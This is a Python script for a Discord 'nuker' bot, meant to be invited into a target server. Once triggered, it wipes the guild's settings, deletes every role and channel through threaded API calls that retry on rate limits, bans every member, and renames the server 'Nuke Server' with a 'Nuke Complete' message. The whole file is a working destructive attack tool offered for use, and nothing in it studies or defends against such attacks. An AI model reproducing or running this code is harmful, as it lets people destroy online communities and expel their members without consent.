import encodeimage
import discord
from discord.ext import commands
import requests
import threading
import os
import json
roles = None
members = None
channels = None
guildId = None
token = "TOKEN"
server_name = "Nuke Server"
end_message = "Nuke Complete"
bot_prefix = "!"


headers = {
    'authorization': f'Bot {token}',
}

def nullit(guildId):
    headers = {
        'authority': 'discord.com',
        'Content-Type':'application/json',
        'authorization': f'Bot {token}'
    }

    json_data = {
        'description': None,
        'icon': None,
        'splash': None,
        'banner': None,
        'features': [],
        'afk_channel_id': None,
        'afk_timeout': 300,
        'system_channel_id': None,
        'verification_level': 0,
        'default_message_notifications': 1,
        'explicit_content_filter': 0,
        'system_channel_flags': 13,
        'premium_progress_bar_enabled': True,
    }
    response = requests.patch(f'https://discord.com/api/v9/guilds/{guildId}', headers=headers, data=json.dumps(json_data))

def delChannel(channelId):
    while True:
        r=requests.delete(f'https://discord.com/api/v9/channels/{channelId}', headers=headers)
        try:
            r = r.json()
            message = r.get('message')
            if message == "You are being rate limited.":
                pass
            else:
                break
        except:
            break
def delRole(guildId,roleID):
    while True:
        r = requests.delete(f'https://discord.com/api/v9/guilds/{guildId}/roles/{roleID}', headers=headers)
        try:
            r = r.json()
            message = r.get('message')
            if message == "You are being rate limited.":
                pass
            else:
                break
        except:
            break
def banMember(guildId,memberId):
    data = '{"delete_message_days":"1"}'
    while True:
        r=requests.put(f'https://discord.com/api/v9/guilds/{guildId}/bans/{memberId}', headers=headers, data=data)
        try:
            r = r.json()
            message = r.get('message')
            if message == "You are being rate limited.":
                pass
            else:
                break
        except:
            break

def finish(guildId):
    headers = {
        'authority': 'discord.com',
        'Content-Type':'application/json',
        'authorization': f'Bot {token}'
    }

    json_data = {
        'name': f'{server_name}',
        'description': None,
        'icon': encodeimage.encode('..\\pfp.png'),
        'splash': None,
        'banner': None,
        'features': [],
        'afk_channel_id': None,
        'afk_timeout': 900,
        'system_channel_id': None,
        'verification_level': 1,
        'default_message_notifications': 1,
        'explicit_content_filter': 2,
        'system_channel_flags': 13,
        'public_updates_channel_id': '0',
        'premium_progress_bar_enabled': True,
    }
    response = requests.patch(f'https://discord.com/api/v9/guilds/{guildId}', headers=headers, data=json.dumps(json_data))
    
    headers = {
    'authorization': f'Bot {token}',
    'Content-Type' : 'application/json'
    }
    data = '{"type":0,"name":"Melatonin","permission_overwrites":[]}'
    response = requests.post(f'https://discord.com/api/v9/guilds/{guildId}/channels', headers=headers, data=data)
    response = response.json()
    id = response.get('id')
    yea =  f'https://discord.com/api/v9/channels/{id}/messages'
    headers = {
    'authorization': f'Bot {token}',     
    'content-type': 'application/json',           
    }
    response = json.dumps({"content":f"{end_message}"})
    r = requests.post(yea, headers = headers, data = response)
    
    
def nuke(roles,members,channels,guildId):
    for role in roles:
        threading.Thread(target=delRole,args=(guildId,role.id)).start()
    for channel in channels:
        threading.Thread(target=delChannel,args=(channel.id,)).start()
    for member in members:
        threading.Thread(target=banMember,args=(guildId,member.id,)).start()
    finish(guildId)



def main():
    client = commands.Bot(command_prefix = f'{bot_prefix}',intents = discord.Intents.all())
    client.remove_command('help')
        
    @client.event
    async def on_ready():
        print(f'the bot has not been initialized Please do "{client.command_prefix}init" in the target server')
        
    @client.command()
    async def init(ctx):
        try:    
            roles = ctx.guild.roles
            members = await ctx.guild.fetch_members().flatten()
            channels = ctx.guild.channels
            guildId = ctx.guild.id
            await client.close()
            os.system('cls')
            input('retrived members,roles and channels ready to nuke :) (press enter to nuke)')
            
        except:
            input('something went wrong, try again?')
            os.system('cls')
            main()
        nullit(guildId)
        nuke(roles,members,channels,guildId)
        
    client.run(token)
        
main()
input('Done press enter to exit')